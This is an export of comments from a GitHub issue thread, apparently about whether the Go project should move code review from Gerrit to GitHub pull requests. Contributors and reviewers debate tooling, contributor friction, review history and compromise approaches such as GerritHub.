Go is significant enough to get contributions despite arduous contribution process but it certainly turns away significant number of potential contributors, myself included.

I applaud that Go team recognizes that as an issue but if attempted solution is unscalable in-person tutoring that achieves worse results than bigger, more active projects (Swift, Tensorflow, Visual Studio Code, TypeScript, .NET to name just a few) then maybe it's time to ponder why Apple, Microsoft and even other Google employees are capable to be productive using GitHub UI for reviews AND make contributing easy.

There are thousands of projects on GitHub, quite a few bigger than Go, yet as far as I know Go is the only one that insists on this semi-hosting on GitHub and insisting on using separate tooling for submitting contributions.

"
3093	"> Even with the recent changes, the current PR system in GH does not manage revisions of a changeset well.

I'd like to explicitly reiterate this. I review large PRs all the time. They often have multiple updates over a significant period of time as a PR iterates towards acceptance. In github, when rebase workflow is used (almost universal) I *cannot* see the difference between different updates. That is, if I ask for some changes to be made, I cannot see whether those changes have if fact been made. This is crucial! Without this feature, reviewing takes longer and is more error prone.

Even if the submitter remembers to avoid rebasing before submitting an update, the changes are still lost when the branch is rebased when the PR is accepted. When diagnosing problems, it is incredibly useful when I can go back in time and see the *full history* of a given commit. Github does not make that possible. This for me is the main reason that I don't believe Go should move to using pure github reviews.

"
3094	"Are the changes that led up to a particular change set really that important @rogpeppe ? I understand it can be valuable in some instances but isn't the resulting change set what matters and even what should be reviewed? The fact that it took a hundred steps or just a few is not that relevant right? Perhaps I am simplifying it a bit but when I look at source history I prefer atomic meaningful changes that are free of tiny nitpicking ""fix"" commits."
3095	There are already some third-party plugins for code review like reviewable.io. If Gerrit can be integrated nicely like reviewable.io, then not only the Go team can still have the best experience, other projects on Github can benefit from it as well.
3096	"> Are the changes that led up to a particular change set really that important @rogpeppe ?

Absolutely. I regularly go through the code history and read discussions on changes (sometimes from years ago!) in order to understand why something is the way it is today. On Gerrit, it's fairly easy to follow. GitHub's PR review system makes it really hard for me to follow the discussion that occurs on a PR after the fact. I'm speaking as someone who uses both Gerrit and GitHub's review system."
3097	Point taken @dsnet I get that going through the discussions can be very helpful to understand why something is the way it is. I don't think Gerrits upper hand outweighs the easy of contribution though.
3098	"Is there an ongoing effort to get GitHub to add some of these important features, such as PR revision tracking? I would be in favor of this proposal if it was coupled with reducing the pain that changing to GitHub would have on reviewers and maintainers.

If the intent is to switch to GitHub as it is today, I lean against the switch. As others have pointed out, the number of reviewers is relatively small and the quality of reviews would drop, given that the tool is just not as powerful."
3099	"+1000
Use usual workflow with github = really open source and a lot more contributers"
3100	"While I do agree that GitHub has improved a lot and that the PR system has become better (and more closely aligned to that of Gerrit), I think that @dsnet clearly makes a strong point here about GitHub making it difficult to follow history. Until then, Gerrit holds the upper hand.

While I would like to have GitHub used for the sake of simplicity in the process, I think that switching at this point would have the opposite effect. In my opinion using Gerrit does not make the project less community-run. Everybody is welcomed to contribute.

Additionally, as far as I know, Gerrit stores all the review data in a ref on the project (`refs/changes/*`, `refs/review/*`, etc). This can be fetched if you ever wish to move the repository without losing history. GitHub on the other hand owns all your PR data and I personally don't know of an easy way to extract it (although there are some [backup](https://help.github.com/articles/backing-up-a-repository/) tools)."
3101	"> Is there an ongoing effort to get GitHub to add some of these important features, such as PR revision tracking?

Whenever I've asked on this topic - GitHub is really cagey about what they do in this area. They run a very opinionated shop (which is good, it made them the success they are!) but the result is feedback seems rarely listened to. In fact recently had a run in with their sales drones who were claiming that our Org. didn't own the rights to our repositories (I kid you not!)

> There are already some third-party plugins for code review like reviewable.io. If Gerrit can be integrated nicely like reviewable.io, then not only the Go team can still have the best experience, other projects on Github can benefit from it as well.

Replacing one external tool with another doesn't seem like the right fix for anyone."
3102	"As a day zero Go contributor I appreciate efforts that make contributions easier for everybody. But we don't just want any contribution, we want high-quality contributions. ""Open-source"" is not a quality seal per se. Thorough code reviews are a primary mechanism to raise and maintain high quality, and thus the code review tool is of primary importance. The selection of Gerrit was a deliberate choice. In fact we would much prefer much more sophisticated code review tools (and we use one inside Google). I think any move to a different system (incl. just Github) would have to provide at least as good a code review experience or better.
"
3103	">  In fact recently had a run in with their sales drones who were claiming that our Org. didn't own the rights to our repositories (I kid you not!)

That sounds troubling.

As it stands - for me, even being an external observer, reviews for the complex patches like ticker per goroutine and GC patches are a must. Gerrit is just that better at following the ""train of thought"" in such code review."
3104	FWIW I think that small code reviews would be just fine with pure github. I'm thinking things like typo correction, adding examples, fixing doc comments. It's hard to know where the line should be drawn though.
3105	"@kjk I should be honoured that you compare my little toy projects with Go. Thanks!

But the comparison (and thus your argument) is lacking: I accepted 11 PRs for chart in 6 years, the last one 2 years ago. For ht all 4 PRs came from a colleague and we discussed these tiny fixes over a coffee.
PRs on Github are fine if you have to handle 15 in 6 years, let's say one PR every three month. But any workflow and GUI would do so this doesn't prove anything.

You mentioned ""thousands of projects on GitHub, quite a few bigger than Go"" who are happy with Github PRs. This is fine but no argument that Github PRs are good enough to replace Gerrit (which _is_ better and offers more features). 

You argued that ""Go is the only one that insists on this semi-hosting on GitHub and insisting on using separate tooling for submitting contributions"". I might be wrong but git itself and Linux don't do github PRs for contributions."
3106	"@kjk Just as another example, Clojure is hosted on github, however all contributing is done elsewhere.

//edit - IMO it suffers all the same problems, contributing is way too hard so many don't."
3107	"> Switching to GitHub means GH is the sole source of truth for Go. This means if anything happens to GitHub—outages, data loss, whatever—or if GH does anything to its product—API limits, changes that break Go's workflow, etc—Go is out of luck. The Go project can avoid those problems if it uses an OSS tool, like Gerrit or GitLab.

Agreed. GitLab's own review tools have vastly improved. The per-commit review process of Gerrit (which has been widely said to be lacking on GitHub and as such often evaluated as a major showstopper) is already possible in some way on GitLab, and scheduled for improvement, or very open to such ([here](https://gitlab.com/gitlab-org/gitlab-ce/issues/31847), [here](https://gitlab.com/gitlab-org/gitlab-ce/issues/21557), [here](https://gitlab.com/gitlab-org/gitlab-ce/issues/32313), and if you want it please make your voice heard). GitLab's way of operation is sufficiently close to the one of GitHub to be easily approachable by the community at large, and much more palatable than the one of Gerrit. I have heard strange points being made about the latter as being some sort of ""barrier to entry"" to contributions, inasmuch as a worthy contribution should be coming from a contributor that is supposed to be able to withstand whatever strangeness the review process imposes on him.

The trump card here in favour of GitHub is that Go code has been migrated to GitHub recently, so it's already there and going through another migration may be painful.

Point of note: GitLab may or may not != gitlab.com."
3108	I've contributed a few times to Go and the Gerrit learning curve exists, no doubt, but after 30 minutes I easily got the hang of it. In simplest terms, it's replacing `push` with `mail` (and amending commits instead of making additional, which I prefer anyway). I actually liked the review experience so much with Gerrit in my few Go commits that the company I work for switched to Gerrit for all of our projects. I think the argument for ease of use makes sense for smaller projects where the incentive to contribute is lower and reviews are smaller, but at the scale of Go, it should really be up to the reviewers what is the quickest for them. Does it make sense to inconvenience the few reviewers for the convenience of contributors, especially given the inconvenience is less than an hour the first time?
3109	"> I think the argument for ease of use makes sense for smaller projects where the incentive to contribute is lower and reviews are smaller, but at the scale of Go, it should really be up to the reviewers what is the quickest for them.

I agree. I would consider adding the point that quality > quantity when it comes to contributions on something so depended on the world over. I remember all the early day releases and breaking changes! So for me, it's about the quality of the reviews. If people reviewing need Gerrit to do that work, then that is what should be used."
3110	"> I think the argument for ease of use makes sense for smaller projects where the incentive to contribute is lower and reviews are smaller, but at the scale of Go, it should really be up to the reviewers what is the quickest for them.

True enough, yet if the reviewers have to spend an inordinate amount of time training contributors or fixing a mess because of some impedance mismatch then it's a losing proposition."
3111	"The most frustrating aspect of contributing to open source projects is
finding knowledgeable reviewers and getting them to review code in a timely
fashion. Unlike learning gerrit getting code reviewed is the one thing that
is out of the contributor's control. If reviewers are claiming that their
job is easier with gerrit, and it is, then learning gerrit is a small price
to pay for gaining access to knowledgeable reviewers. This needs to be a
discussion about reading and reviewing code. More importantly it should be
a discussion about maintaining the history of the reviews as code moves
through merging, rebasing, testing, and benchmarking.




On Thu, Sep 21, 2017 at 8:35 AM, Loic Nageleisen <notifications@github.com>
wrote:

> Switching to GitHub means GH is the sole source of truth for Go. This
> means if anything happens to GitHub—outages, data loss, whatever—or if GH
> does anything to its product—API limits, changes that break Go's workflow,
> etc—Go is out of luck. The Go project can avoid those problems if it uses
> an OSS tool, like Gerrit or GitLab.
>
> Agreed. GitLab's own review tools have vastly improved. The per-commit
> review process of Gerrit (which has been widely said to be lacking on
> GitHub and as such often evaluated as a major showstopper) is already
> possible in some way on GitLab, and scheduled for improvement, or very open
> to such (here <https://gitlab.com/gitlab-org/gitlab-ce/issues/31847>, here
> <https://gitlab.com/gitlab-org/gitlab-ce/issues/21557>, here
> <https://gitlab.com/gitlab-org/gitlab-ce/issues/32313>, and if you want
> it please make your voice heard). GitLab's way of operation is sufficiently
> close to the one of GitHub to be easily approachable by the community at
> large, and much more palatable than the one of Gerrit. I have heard strange
> points being made about the latter as being some sort of ""barrier to entry""
> to contributions, inasmuch as a worthy contribution should be coming from a
> contributor that is supposed to be able to withstand whatever strangeness
> the review process imposes on him.
>
> The trump card here in favour of GitHub is that Go code has been migrated
> to GitHub recently, so it's already there and going through another
> migration may be painful.
>
> Point of note: GitLab may or may not != gitlab.com.
>
> —
> You are receiving this because you are subscribed to this thread.
> Reply to this email directly, view it on GitHub
> <https://github.com/golang/go/issues/21956#issuecomment-331143094>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/AA7WnyPR6av9lmJ5UsH6b8QhMZu7LGuqks5sklgjgaJpZM4Per9v>
> .
>
"
3112	Not using GitHub is a good litmus test for contributors, keeps the bad ones out of the patch queue!
3113	"You would have more reviewers if you used GitHub code reviews.  

I truly don't believe the hype that Gerrit produces better code for the project because of its features. I've used ReviewBoard, which has all of the features mentioned in this thread and others, and it did not produce any increase in overall code quality or increase the speed of reviews."
3114	"> Not using GitHub is a good litmus test for contributors, keeps the bad ones out of the patch queue!

Keep the people eager to get into contributing out?

The people who may have some great, creative, innovative ideas and just need a bit of review and refactor from the community to get them on board with contributing?

There's a reason reviews exist. I don't think anyone would agree with pushing eager contributors away from an open source project."
3115	Eagerness doesn't make for good patches. What kind of person is eager to contribute to a compiler but not eager to learn a new (maybe even superior!) tool? Answer: the kind of person whose patches are probably not worth reviewing.
3116	"I read through all the comments in this already very long thread, which I do not want to make longer but I feel it is necessary to point something out.

Most of those commenting are not putting themselves in the other persons shoes. We have on one side contributors, and yes I agree contributing to Go is more difficult than other project. On the other side we have the reviewers, and I also agree Gerrit is a better tool for patch review. I have worked on large projects on GitHub, yes even with the new code review, and Gerrit is a cleaner approach. It is better for code review in my opinion. It uses the features in git better as well. It took me awhile to get used to Gerrit which does prove there is a barrier to entry but I think the people in this thread need to stop dismissing the needs of the reviewers and more work towards _how_ we can make GitHub work for them. Because honestly maintaining any large project on GitHub or off is insanely difficult and arduous."
3117	"I have the impression that, besides inertia, the resistance to move from Gerrit to GH has a great deal to do with the degrading workflow experience for the reviewers. This is very valid. 

However, if it is so, it contradicts the message that `The Go project welcomes all contributors`. No it doesn't. It welcomes those who have the time to contribute so frequently they don't need to refer to ""the guide"" anymore, or those who don't contribute so frequently but also have that time.

I for one have some TLS related examples I want to add but every time I think about doing that I realize I need to carve out time to also read ""the guide"" first, and keep postponing it. My (first and) last contribution was so long ago I no longer remember the workflow.

So one trade off that seems center stage to this question is: is the Go team willing to give up some usability experience to have more contributors?

Another issue related to this that we could think about: with a lesser reviewer experience + more incoming contributions, in case the code base is moved to GH, would life for the Go team not be made much worse in terms of getting PRs reviewed and accepted? I think one answer to that is to add more reviewers?"
3118	">However, if it is so, it contradicts the message that The Go project welcomes all contributors. No it doesn't. It welcomes those who have the time to contribute so frequently they don't need to refer to ""the guide"" anymore, or those who don't contribute so frequently but also have that time.

""The Go project welcomes all contributors, except for those who can't be bothered to learn our review process, coding style, unit tests, won't follow up on review comments..."" This is a tautology. Contributors who won't bother to learn how the project is governed are worth their weight in dust."
3119	I prefer open source projects personally even though GitHub is nice Gerrit or GitLab would be better choices.
3120	"> more work towards how we can make GitHub work for them. Because honestly maintaining any large project on GitHub or off is insanely difficult and arduous


I agree. Perhaps we could consolidate a list of the attributes of Gerrit that reviewers prefer over Github, to see what needs to be bridged and provide a framework for doing so.

From skimming this thread, the two that I noticed mentioned already were:

1. Draft comments in reviews (possibly already supported by Github?) 
2. Keeping a tally of outstanding issues on a pull request

though that's not a complete list.

"
3121	"Hi,

After reading this and having some experience with getting contributors to send patches to Go (via Gophers Slack and real-life) here is what I can see.

First, this issue and its comments:

- there are quite a few people who have not contributed to Go at all asking for Github to be the primary way of doing contributions in order to make things simpler
- there are a few Go contributors who think that Go must strive to make the contribution process easier and Github would accomplish that
- there are a few Go contributors who see the value in Gerrit and the way it works

Now from the non-issue side:

- people have big problems with setting up the environment for working Go correctly
- I've never had to explain Gerrit to anyone that had a working patch for Go. However I did had to explain how to setup the environment so that Go can be developed.

Based on evidence from active maintainers of Go, it seems that the real problem is the fact that there are too few reviewers compared to the number of patches they are receving.
Looking at Gerrit, this does seem to support the statement.

Personally I don't see a problem in using Gerrit. For the few times I had to use it felt very intuitive and easy to use.

So then what's to do with contributors and their numbers?

The problem that this issue wants to address seems a non-problem, just by looking at the numbers from Gerrit.
It's not the lack of code commiters that send patches to Go, it's a problem of having them reviewed, improved and merged.
Contributors don't necessarily have to be code commiters. They can be people that check the PR and review it, have helpful comments, support people working on PRs, help writing documents and so on.

Moreover, the quality of the contributions needs to be in line with the current contributions as well as having the same level of support for them as today (if not better, in both cases).

In my humble opinion, the real problem is that this page: https://golang.org/doc/contribute.html is really not up geared towards making the process easy.
When I've first tried to send my first (and only) contribution to Go, that page just made me question everything. It's not a friendly page by all means, the structure is bad, the examples are poor and half open.
Those are the exact kind of problems that are solved with posts like this: https://medium.com/@vCabbage/go-testing-standard-library-changes-1e9cbed11339
People need to have an easy workflow to contribute and Github is familiar for many, but it's not the only one. Once learned, the current tooling is rather enjoyable and easy to use as well.

And to end this with a question: If people are so eager to contribute to Go but they find the process hard to do and give up so easily, would you really want that person to contribute to begin with? Because that's a signal that the person might not stick around to maintain it so someone else would need to pick it up. What contributions are being missed because of this issue?


P.S.
Am I a bad contributor because I've not fixed the page I'm complaining about or not even opened an issue? Yes, that's true. Unfortunately it's not a top priority for me so I never get around fixing it and my time is very limited."
3122	"> Contributors who won't bother to learn how the project is governed are worth their weight in dust.

You are conflating `learn`, which in this case here is an attempt to demean a person's intelligence, with `memorize`.  "
3123	"To add to @ChimeraCoder's list https://github.com/golang/go/issues/21956#issuecomment-331157441:

3. commit message review
4. most importantly, patch revisions that allow seeing how a patch evolved over time (GitHub allows this in a very very fragile form if the author never rebases, and the submitter uses squash-and-rebase and rewrites the commit message not to be a long list of ""`fix comments`"")

Any reason we are not willing to give #18517 a chance at being a compromise where small contributions can come via PRs, but complex reviews are done on Gerrit?"
3124	"> People need to have an easy workflow to contribute and Github is familiar for many, but it's not the only one. Once learned, the current tooling is rather enjoyable and easy to use as well.

When you speak in terms of ""easy"", you are demeaning people's intelligence. The issue here is NOT that people can't learn the workflow. The issue is not that it is hard to learn. The issue is that it is not familiar. It is a process that it is different from what most of us use everyday."
3125	"Commit message review is my main feature I love in Gerrit. I also like how
it submits commits messages with who reviewed.

"
3126	"> When you speak in terms of ""easy"", you are demeaning people's intelligence. The issue here is NOT that people can't learn the workflow.

I was not referring to their intelligence as I can't quantify that. 

> The issue is not that it is hard to learn. The issue is that it is not familiar. It is a process that it is different from what most of us use everyday

Thus they shouldn't be scared to try something new / different :)"
3127	"> Thus they shouldn't be scared to try something new / different :)

Says who, you? What is your argument? Mine is that it is a `barrier` to contribution. It requires context switching."
3128	"> Thus they shouldn't be scared to try something new / different

I'm in the same situation as @carlisia and others in this thread. I've tried the ""new / different"" way, I've submitted CLs, but I don't come back regularly. I work on Github all day and, not being a frequent contributor, I have to completely switch gears to a different style of work for Gerrit.

That said, I think this issue would be better served if we focused on the list @ChimeraCoder started and @FiloSottile expanded. Understanding the trade-offs the current frequent reviewers would have to make is crucial."
3129	The point that reviewers should have it easy is a perfectly cogent one, but – paraphrasing a well known adage – it should not make trivial contributions any less trivial to submit. Everyone's time is valuable, and the review process is a *communication* tool that should empower both the reviewer and the reviewee.
3130	"> Says who, you? What is your argument? Mine is that it is a barrier to contribution. It requires context switching.

> I'm in the same situation as @carlisia and others in this thread. I've tried the ""new / different"" way, I've submitted CLs, but I don't come back regularly. I work on Github all day and, not being a frequent contributor, I have to completely switch gears to a different style of work for Gerrit.

But this all points to a very different problem: lack or improper documentation.

Why is it a barrier of entry? Because of the UI? Because of the fact that instead of ` git push ` you do ` git sync ` ? Because people need to signup to Gerrit as well (which would need to anyway to manage their CLA)? Because of the Gerrit UI which can be used in the same way as Github?

Where are all the issues in Slack, Reddit or golang-nuts asking for help with Gerrit because there's a contribution that's sitting in a branch but the author doesn't know how to use Gerrit? Did someone asked and it was not immediately replied with an answer that's helpful?

And let me put it very bluntly: what contributions do you have, sitting right now in branches in your local Go development setup that you cannot push because Gerrit is too complex to use?

So, you'd rather have the Go team rebuild their infrastructure around Github for the next 6+ months or you'd have someone in the community contribute better documentation on how to contribute to Go?"
3131	What I'm saying is: all these assumptions start from the wrong end of the problem: fix the docs, fix the tooling then, finally, if all else fails, migrate to github. Not the other way around.
3132	Or, the other way around: migrate to GitHub and try it out for a while.
3133	"> Or, the other way around: migrate to GitHub and try it out for a while.

Again, So, you'd rather have the Go team rebuild their infrastructure around Github for the next 6+ months or you'd have someone in the community contribute better documentation on how to contribute to Go?"
3134	"You're missing the point @dlsniper. This isn't about having problems with Gerrit. This is about how different it is, how it requires everything you described: a different UI, a different `git` subcommand, a different signup process. None of these things are huge issues, but they're a lot of paper cuts that add up and push people away.

I understand that none of these bother you and that's fine but they do bother some of us. Perhaps many, given how many people left reactions on @natefinch's original post.

And, again, I don't want to be dismissive of the many changes that would need to happen for the Go team to do this. It might not be worth to do it in the end but it certainly is worth considering what would change and if we can live with it."
3135	"> Again, So, you'd rather have the Go team rebuild their infrastructure around Github for the next 6+ months 

@dlsniper has a point, time wasted on migrating infra around GitHub is just not worthy. It will take a long time for it to work properly, just to gain an amount of contributors that (sadly) can't fully understand the contribution guide, thing that can be improved by the community.

> or you'd have someone in the community contribute better documentation on how to contribute to Go?

Quality > quantity, and some of those changes may be really disruptive for the language itself, though."
3136	"Oh, and a note on reviews of large patches. Looking at Gerrrit, ~95% of currently open CLs are under 500 LOC.   ~99% are under 1500.  (these are visual estimates, I don't have tooling to get concrete numbers).  So, the benefit of gerrit for large reviews seems minimal, since there just aren't that many large reviews (which is good, of course).

In addition, I'll say it again - using familiar tooling will get you not only more code contributions, it'll also get you more *reviewers*."
3137	"So, one thing that I feel wasn't emphasized enough: The history-feature of gerrit isn't so much about after-the-fact reading through the history, but about *making the review easier* (for both sides). It means, that when I do a lengthy review (I don't use gerrit to review, but a proprietary system with similar features), I can a) do a review, b) send out my comments, c) forget about it, d) come back when they are addressed and e) look at the diffs to my previous reviews and whether they satisfactorily addressed my comments. I.e. just like I trust HEAD to contain good code and thus only check diffs, I trust my previous self to have commented on the correct things and only check diffs against that.

I say that, to make the value gerrit provides a little clearer: Instead of having to review *the whole change* on each iteration, you reduce the review to only the diffs of the iterations (and maybe an additional comprehensive review once the change converged). That is a *huge* time-saver for large changes.

Or to put it another way: Someone said up-thread

> I understand it can be valuable in some instances but isn't the resulting change set what matters and even what should be reviewed?

you wouldn't suggest reviewing the complete resulting codebase for each suggested change - reviewing produced diffs has clear advantages. Exactly the same goes for large, iterated reviews.

---

I agree that the current process is cumbersome (though, TBQH, it could probably be split up in the ""setup"" and ""review"" phases, some smaller things could be pruned and in the end you'd end up with a fairly straight forward, quick process), that gerrit could integrate better with github, and that github should grow better code review tooling. All of these, I believe, are true and I *think* there isn't really disagreement about them.

But at least for me, personally, what keeps me from contributing (apart from ""finding the time"") is knowing *what* to contribute - where my limited abilities can have the most/best/any positive impact on the project. If I have a patch ready, personally I don't care for what hoops I have to jump through to get it submitted."
3138	@natefinch I think more interesting that LOC/patch would be iterations/review. If I produce 10K SLOC of perfect code, there doesn't need to be any iteration and progress-tracking becomes irrelevant. Meanwhile, if I review 100 lines of code and we need to go through 5 iterations, I'll get grumpy having to read the same 100 lines over and over again.
3139	"> Oh, and a note on reviews of large patches. Looking at Gerrrit, ~95% of currently open CLs are under 500 LOC. ~99% are under 1500. (these are visual estimates, I don't have tooling to get concrete numbers). So, the benefit of gerrit for large reviews seems minimal, since there just aren't that many large reviews (which is good, of course).

Can you please explain how you've looked at Gerrit to see those numbers? As I can't see them using the Search functionality available https://gerrit-review.googlesource.com/Documentation/user-search.html

I'll put some effort to get an analysis done via the API see how many of these are having comments, what's their distribution over time, how often do the developers abandon them and what's the distribution of comments per line of code for those PRs.

> But at least for me, personally, what keeps me from contributing (apart from ""finding the time"") is knowing what to contribute - where my limited abilities can have the most/best/any positive impact on the project. If I have a patch ready, personally I don't care for what hoops I have to jump through to get it submitted.

I'm very much in the same position as @Merovius.
And I think that's the case for most people that would actually contribute back to Go. I'm trying to teach as many people as I can so that they can contribute to it.

And here's another fact. This issue is: let's just use github. How do you plan to migrate the existing CLs to it? All the history?

It's very easy to think: ""migrate to GitHub and try it out for a while"" when you have to invest no effort into it. 

So far, none of my questions have been answered yet I've been called out for insulting people's intelligence or my questions where completely avoided. Can we have a discussion based on evidence not feelings?"
3140	"@dlsniper I went here: https://go-review.googlesource.com/q/status:open and clicked ""next"" a lot. ¯\\_(ツ)_/¯"
3141	@dlsniper you should be able to get the data using Maintner (golang.org/x/build/maintner/godata) and the ForeachOpenCL command. If that doesn't work or it's too difficult to get up and running please let me know, I'd appreciate feedback that would make it easier to use.
3142	@kevinburke thanks a lot!
3143	FWIW, I have a number of open CL's that should help (slightly) by adding information to the README for each project about how to get started contributing, where to report errors, etc. the ones marked README here: https://go-review.googlesource.com/q/author:kev%2540inburke.com+is:open+README
3144	">  I also like how it submits commits messages with who reviewed.

+1. [Maintner](https://golang.org/x/build/maintner) uses this metadata to get information about who reviewed each CL, plus I (and maybe others?) have used it in the past to determine who's the best person to review a patch in a given directory, via e.g. `git log /path/to/directory | grep Reviewed-by: | sort | uniq -c`."
3145	"I have carefully read the entire discussion thread and believe the question is wrong: why do the project move to GitHub? It is already there and thrives. Yes, the main reviews are done through [Gerrit Code Review](https://www.gerritcodereview.com) not really to make the contributors' life more difficult but rather to make the review work more manageable and actually make the *overall cycle time of contribution shorter*.

The argument of ""pushing reviews through GitHub is just so much easier"" is the wrong one: the cycle time of a contribution is typically 5% the initial push and 95% the reviews. Are we focusing on optimising the 5% of the problem?

In the Gerrit Community, we tacked the issues multiple times and I have even presented a [talk at the Gerrit User Summit in 2015](https://www.slideshare.net/lucamilanesio/gerrit-codereviewgit-hubplugin) on the issue: we ended up launching the [GerritHub.io](https://www.youtube.com/watch?v=jeWTvDad6VM) free hosting service that has over 20K active users and over 300 companies using it on a daily basis.

In a nutshell, the solution is: take both!

To encourage new contributors to jump onboard and give them an easy way to submit their contribution, they can just create a PR on GitHub and they are automatically imported into Gerrit. Because the integration is done *natively* at Git protocol level, the GitHub PR is just ""linked"" to the Gerrit review and, as soon as the review is merged, the PR gets closed.

Yes, the reviews will stay on Gerrit and that is perfectly fine because it is the best tool to optimise the 95% of the contribution process, where the GitHub integration of [GerritHub.io](http://gerrithub.io) allows to increase the reach of the potential contributors and then the ""fan-in"" of the community.

Accounts? No need to create a Google Account because your existing GitHub account is *trusted* by Gerrit and your identity, including Public Key and Group Ownership is retained in GitHub and used by Gerrit.

I believe that would be the solution to get both ""parties"" of this discussion to agree on a common ground to achieve the best of reach and ease of contribution whilst keeping the rock-solid and reliable Gerrit review workflow.

Gerrit UX sucks? Well, we know and lots of people are working on improving it on a daily basis. An entire team called PolyGerrit UX team is spending time in getting feedback from the community and translating into improvements on the user experience.

Is GitHub getting better? Yes, but at a speed that isn't good enough to keep the pace of Gerrit evolution or user needs.

What is the main difference between GitHub and Gerrit Community and users?

* GitHub: widely used by *millions of developers worldwide* but driven by a company that drives their profits using its popularity. Gives a free service that we love, but it is very slow in implementing what the people wants and needs.

* Gerrit:  used not so widely but still *millions of developers worldwide* (mostly in large companies) and driven by the same users using it every day. Still a free service and evolving very quickly towards the needs of who's using it on a daily basis, its users.

Yes, the Gerrit UX isn't widely known, but at the end of the day we are all developers and if we *are not willing* to learn new tools or frameworks, we are *professionally dead* and we would still be using mainframes and punch cards after all.

Having said that, I do love GitHub and I use it for my company and my projects as well, with reviews on [GerritHub.io](http://gerrithub.io) of course :-)

For those who are saying that Gerrit CLI is complex, let's remind the two flows:

**Pushing code to GitHub requires:**
1. Fork the repo
2. Clone the forked repo
3. Create a commit
4. Push to GitHub
5. Click on create pull request
6. Confirm and review your pull request message

... or you install the GitHub CLI, which requires you to learn the 'hub' commands.

**Pushing code to Gerrit requires:**
1. Clone the repo (original, not the fork)
2. Create a commit
3. Push to Gerrit (```git push origin HEAD:refs/for/master```)

Yes, I know step 3. requires some ""deep knowledge of Git"" (the ```HEAD:refs/for/master```) and that's why you may define a super-complex alias called ""review"" that does that.

Feedback is more than welcome :-)

Luca.
"
3146	"> FWIW I think that small code reviews would be just fine with pure github. I'm thinking things like typo correction, adding examples, fixing doc comments. It's hard to know where the line should be drawn though.

@rogpeppe how about, if it's an obvious +2 with no need for comments, changes, etc, accept it as a PR? otherwise, redirect to gerrit."
3147	"> Yes, I know step 3. requires some ""deep knowledge of Git"" (the HEAD:refs/for/master) and that's why you may define a super-complex alias called ""review"" that does that.

Gogland from Jetbrains has a Gerrit plugin which does this for you as well. If that's of any help to anyone?"
3148	"@leepa the Eclipse Git plugin automatically detects that Gerrit is running on the Server and does it for you ""out of the box"".

I have never met anyone that is familiar with Git that is not able to do even on a CLI a ```git push origin HEAD:refs/for/master```"
3149	+1 @lucamilanesio Also, GitHub is probably going to require more paid add-ons to come close in features. Gerrit is yours to keep, but GitHub may change it's terms or UI.
3150	"@lucamilanesio 
Or — just like installing the commit-hook (for Change-Id) — let users initialize the local repository with

    git config remote.origin.push HEAD:refs/for/master

So that you can just do `git push`."
3151	"> As a day zero Go contributor I appreciate efforts that make contributions easier for everybody. But we don't just want any contribution, we want high-quality contributions. ""Open-source"" is not a quality seal per se. Thorough code reviews are a primary mechanism to raise and maintain high quality, and thus the code review tool is of primary importance. The selection of Gerrit was a deliberate choice. In fact we would much prefer much more sophisticated code review tools (and we use one inside Google). I think any move to a different system (incl. just Github) would have to provide at least as good a code review experience or better.

All that is reasonable but can you explain what makes Go project a special snowflake in this regard?

Go has ~33k commits.

Typescript has ~20k commits, ~5k PRs reviewed via GitHub interface.
Swift has ~60k commits, ~12k PRs
Rust has ~68k commits, ~21k PRs

Are those projects lower quality than Go? Are leaders of those projects ignorant of superior code review tools? Wouldn't they also want to use the best possible tool?

Or maybe they made a **deliberate choice** that being an ""open source project that welcomes contributions from thee community"" requires more effort than paying a lip service to the idea.

That it's about embracing the processes that tens of thousands of other GitHub users know and not about making the community learn your quirky workflows, better as they might be.

The community is pretty clear about what we think is good for community.

The Go Team is also clear what they think is good for a handful of people employed by Google that do reviews and control the project.

Those things are at odds.

Both parties think that what's good for them is good for the project.

Microsoft and Apple and Mozilla show us that you can successfully manage a high-quality, high velocity open-source language project using GitHub alone, in a way that engages community better.

Anders Hejlsberg reviews PRs on GitHub. What makes you so special?
"
3152	"Hello,

I believe the step to Github is a good one to take. I started coding just two or so years ago and still have to make my first contribution to an open source project. The reason I haven’t made a contribution yet is that I simply don’t know what I should contribute. But if I am going to make my first contribution, Go is not the project I will pick. I will be far more likely to contribute to, let’s say, Atom (the text editor); just because I can easily do so at Github with techniques I already learned. It feels familiar.

I am absolutely not saying that making a contribution to the Go project is very difficult or impossible - people do it every day. It’s just that if someone is looking for a project to contribute to on a rainy sunday they might pick another project that they can contribute to via Github over Go: beceause it’s easier, no extra learning is necassary."
3153	"@kjk

> Or maybe they made a deliberate choice that being an ""open source project that welcomes contributions from thee community"" requires more effort than paying a lip service to the idea.

Well, not immediately granting *anyone's* wish (impossible b/c many are contradictory) is not the same as is very unfairly claimed in the quote above.

But *everyone* is free to fork the Go repository *now* and start to accept Github PRs. Becuase Go *is* an open source project, even when not accepting Github PRs into the repository created by Google."
3154	"@mpboom 

You don't choose that project, it chooses you. Good contributions arise from problems naturally encountered. Searching for an opportunity to make a contribution has merit but is of questionable efficacy. Using software, your search is already over. If it itches that badly, you'll scratch.

To me the proposal implies a scenario: The problem has been encountered, your solution in place, but the transmission of that solution is hindered by the lack of an accessible transmission/feedback facility. 100% in agreement. The system is unfriendly.

Does that mean it should be changed? I don't think so. It's optimized for the contributors that contribute most, and is running at the expected efficiency. Look at the project's top contributors and the no. commits, insertions, deletions. An inhuman amount of work goes into this project, and decisions to change things should be weighted based on who is doing that work and affected by the changes.

"
3155	"I understand the comments that people are making in support of using a pure Github process.

However, as a long time free software developer, I'm inclined to dispute the suggestion that using Github reviews would make Go more of an open source project.  Github is a proprietary platform.  Gerrit is free software.  Moving from free software to proprietary software would not make us more open source.

As a practical matter, as others have said, I think that we should fix #18517 and see where we are.  There are solid technical arguments in favor of the Gerrit code review system, and I don't think we should dismiss those arguments.  There are also solid community arguments in favor of accepting Github pull requests, and we shouldn't dismiss those either.  #18517 is intended to be a compromise between those arguments.  I don't think we need to dismiss that compromise before we have even tried it."
3156	"@mpboom but if the instructions and tools for how to contribute where clear, would you do it?

Also, and this is very important, have you looked at a Gerrit before commenting? For example:
- the github equivalent of the PR discussion page: https://go-review.googlesource.com/c/go/+/65231
- the github equivalent of the diff page: https://go-review.googlesource.com/c/go/+/65231/2/src/bytes/reader.go

I'm very serious about the question and I don't want to put you in a negative light or anything. What I want to understand what part of the current system is actually the problem?

@kjk what makes him so special is that he's not that other person. And as opposed to you, he committed to the Go project since day 0.  Also, the Linux Kernel is not developed on Github, just mirrored, make sure you drop by the lkml and tell Torvalds how to do things in his own project as well after this.

